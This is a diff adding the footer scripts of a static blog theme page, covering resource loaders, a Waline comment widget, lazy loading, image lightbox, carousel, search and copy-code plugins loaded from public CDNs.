+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
